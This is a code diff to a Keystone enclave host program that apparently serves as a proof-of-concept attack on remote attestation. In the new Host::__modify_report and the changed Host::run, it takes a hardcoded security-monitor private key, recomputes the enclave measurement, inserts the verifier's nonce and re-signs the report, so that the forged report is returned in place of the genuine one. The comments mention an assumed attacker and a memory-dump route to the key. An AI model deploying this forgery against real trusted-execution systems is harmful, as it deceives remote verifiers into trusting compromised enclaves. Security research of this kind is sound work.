@@ -53,8 +53,10 @@
 #include <iostream>
 #include <stdexcept>
 #include <string>
+#include <vector>
 
 #include "edge/edge_common.h"
+#include "host/hash_util.hpp"
 #include "host/keystone.h"
 #include "verifier/report.h"
 // TODO: add paths to cmakelists
@@ -118,52 +120,95 @@ SharedBuffer::get_unsigned_long_or_set_bad_offset() {
                        : std::nullopt;
 }
 
-// NOTE: this function returns the report
-// structure after reading from memory
 std::optional<Report> SharedBuffer::get_report_or_set_bad_offset() {
   auto v = get_call_args_ptr_or_set_bad_offset();
   if (!v.has_value())
     return std::nullopt;
-
-  // before setting the report we can get the bytes from the shared buffer
-  //===========================
-  //
-  // get address to report bytes
-  byte *report_bytes = (byte *)v.value().first;
-  // create byte array size of report
-  byte report[sizeof(struct report_t)];
-  // copy report bytes
-  std::memcpy(&report, report_bytes, sizeof(struct report_t));
-
-  printf("Printing Report bytes\n");
-  __print_bytes((const byte *)report, sizeof(report_t));
-  struct report_t *report_s = (report_t *)report;
-  printf("SM public key:\n");
-  __print_bytes(report_s->sm.public_key, PUBLIC_KEY_SIZE);
-  printf("Dev public key:\n");
-  __print_bytes(report_s->dev_public_key, PUBLIC_KEY_SIZE);
-  // private key size is 64 bytes including public key
-  byte sm_private_key[64] = {
-      0xa0, 0x86, 0x5d, 0x1a, 0x1b, 0x03, 0xf7, 0xdd, 0x40, 0xd7, 0x23,
-      0x91, 0x5c, 0x21, 0xb2, 0x14, 0x6e, 0x7b, 0xeb, 0x88, 0x6b, 0xe9,
-      0xc3, 0x11, 0x07, 0x62, 0x9e, 0x2d, 0x91, 0x68, 0x3b, 0x72, 0x06,
-      0xea, 0x34, 0x71, 0xc4, 0xa3, 0xa5, 0xae, 0xe1, 0x3d, 0x7a, 0x31,
-      0x02, 0xa8, 0x89, 0x11, 0xb1, 0xcc, 0x8f, 0x51, 0xb3, 0x7b, 0xb9,
-      0xb5, 0x8a, 0x38, 0x26, 0xea, 0x4d, 0xdf, 0xdf, 0xa4};
-  // NOTE: to find the private key we need to run the __dump_memory fn
-  //__dump_memory(report_s, private_key);
-  //===========================
-  //
-
   Report ret;
   ret.fromBytes((byte *)v.value().first);
-  __modify_report(&ret, sm_private_key);
-
   return ret;
 }
-void __modify_report(Report *rep, byte sm_private_key[64]) {
+// NOTE: this function returns the report
+// structure after reading from memory
+// std::optional<Report> SharedBuffer::get_report_or_set_bad_offset() {
+//  auto v = get_call_args_ptr_or_set_bad_offset();
+//  if (!v.has_value())
+//    return std::nullopt;
+//
+//  // before setting the report we can get the bytes from the shared buffer
+//  //===========================
+//  byte *report_bytes = (byte *)v.value().first;
+//  // create byte array size of report
+//  byte report[sizeof(struct report_t)];
+//  // copy report bytes
+//  std::memcpy(&report, report_bytes, sizeof(struct report_t));
+//
+//  //  printf("Printing Report bytes\n");
+//  //  __print_bytes((const byte *)report, sizeof(report_t));
+//  struct report_t *report_s = (report_t *)report;
+//  // printf("SM public key:\n");
+//  // __print_bytes(report_s->sm.public_key, PUBLIC_KEY_SIZE);
+//  // printf("Dev public key:\n");
+//  //__print_bytes(report_s->dev_public_key, PUBLIC_KEY_SIZE);
+//  // private key size is 64 bytes including public key
+//  byte sm_private_key[64] = {
+//      0xa0, 0x86, 0x5d, 0x1a, 0x1b, 0x03, 0xf7, 0xdd, 0x40, 0xd7, 0x23,
+//      0x91, 0x5c, 0x21, 0xb2, 0x14, 0x6e, 0x7b, 0xeb, 0x88, 0x6b, 0xe9,
+//      0xc3, 0x11, 0x07, 0x62, 0x9e, 0x2d, 0x91, 0x68, 0x3b, 0x72, 0x06,
+//      0xea, 0x34, 0x71, 0xc4, 0xa3, 0xa5, 0xae, 0xe1, 0x3d, 0x7a, 0x31,
+//      0x02, 0xa8, 0x89, 0x11, 0xb1, 0xcc, 0x8f, 0x51, 0xb3, 0x7b, 0xb9,
+//      0xb5, 0x8a, 0x38, 0x26, 0xea, 0x4d, 0xdf, 0xdf, 0xa4};
+//  // NOTE: to find the private key we need to run the __dump_memory fn
+//  //__dump_memory(report_s, private_key);
+//  //===========================
+//
+//  Report ret;
+//  // ret.fromBytes((byte *)v.value().first);
+//  // init repot
+//  ret.fromBytes((byte *)report_s);
+//  printf("\n[HOST-DEBUG] Printing report before modification\n");
+//  ret.printPretty();
+//
+//  Host::__modify_report(report_s, sm_private_key);
+//  // reset report init
+//  ret.fromBytes((byte *)report_s);
+//  printf("[HOST-DEBUG] Printing report after modification\n");
+//  ret.printPretty();
+//  return ret;
+//}
+void Host::__modify_report(struct report_t *rep, byte sm_private_key[64],
+                           const std::string &nonce) {
+  // NOTE: assuming the attacker can compile the source code of the original
+  // enclave to get the following files
+  const char *loader =
+      "/home/debian/keystone-examples/attestation-goodram/loader.bin";
+  const char *runtime =
+      "/home/debian/keystone-examples/attestation-goodram/eyrie-rt";
+  const char *eapp =
+      "/home/debian/keystone-examples/attestation-goodram/attestor";
+  byte enclave_hash[MDSIZE];
+  Keystone::Enclave::measure((char *)enclave_hash, eapp, runtime, loader);
+  // hash files to create the enclave hash
 
-  // TODO:
+  // forge the new report
+  // add data just in case
+  rep->enclave.data_len = nonce.length() + 1;
+  // // byte data[ATTEST_DATA_MAXLEN];
+  std::memcpy(rep->enclave.data, nonce.c_str(), nonce.length() + 1);
+
+  // hash
+  memcpy(rep->enclave.hash, enclave_hash, MDSIZE);
+  //  signature
+
+  int signature_size = 64;
+  int attest_data_maxlen = 1024;
+  int message_len = sizeof(struct enclave_report_t) - signature_size -
+                    attest_data_maxlen + rep->enclave.data_len;
+  byte enclave_bytes[sizeof(enclave_report_t)];
+  std::memcpy(enclave_bytes, &rep->enclave, sizeof(enclave_report_t));
+  // generate the new signature
+  ed25519_sign(rep->enclave.signature, enclave_bytes, message_len,
+               rep->sm.public_key, sm_private_key);
 }
 uintptr_t SharedBuffer::data_ptr() {
   return (uintptr_t)edge_call_ + sizeof(struct edge_call);
@@ -412,5 +457,37 @@ Report Host::run(const std::string &nonce) {
   uintptr_t encl_ret;
   enclave.run(&encl_ret);
 
-  return *run_data.report;
+  Report rep = *run_data.report;
+  // before setting the report we can get the bytes from the shared buffer
+  //===========================
+  byte *report_bytes = reinterpret_cast<byte *>(&rep);
+  // create byte array size of report
+  byte report[sizeof(struct report_t)];
+  // copy report bytes
+  std::memcpy(&report, report_bytes, sizeof(struct report_t));
+  struct report_t *report_s = (report_t *)report;
+  byte sm_private_key[64];
+  if (true) {
+    byte private_key[64] = {
+        0xa0, 0x86, 0x5d, 0x1a, 0x1b, 0x03, 0xf7, 0xdd, 0x40, 0xd7, 0x23,
+        0x91, 0x5c, 0x21, 0xb2, 0x14, 0x6e, 0x7b, 0xeb, 0x88, 0x6b, 0xe9,
+        0xc3, 0x11, 0x07, 0x62, 0x9e, 0x2d, 0x91, 0x68, 0x3b, 0x72, 0x06,
+        0xea, 0x34, 0x71, 0xc4, 0xa3, 0xa5, 0xae, 0xe1, 0x3d, 0x7a, 0x31,
+        0x02, 0xa8, 0x89, 0x11, 0xb1, 0xcc, 0x8f, 0x51, 0xb3, 0x7b, 0xb9,
+        0xb5, 0x8a, 0x38, 0x26, 0xea, 0x4d, 0xdf, 0xdf, 0xa4};
+    memcpy(sm_private_key, private_key, 64);
+  } else {
+    // NOTE: to find the private key we need to run the __dump_memory fn
+    __dump_memory(report_s, sm_private_key);
+  }
+
+  printf("\n[HOST-DEBUG] Printing report before modification\n");
+  rep.printPretty();
+
+  Host::__modify_report(report_s, sm_private_key, nonce);
+  // reset report init
+  rep.fromBytes((byte *)report_s);
+  printf("[HOST-DEBUG] Printing report after modification\n");
+  rep.printPretty();
+  return rep; // return *run_data.report;
 }
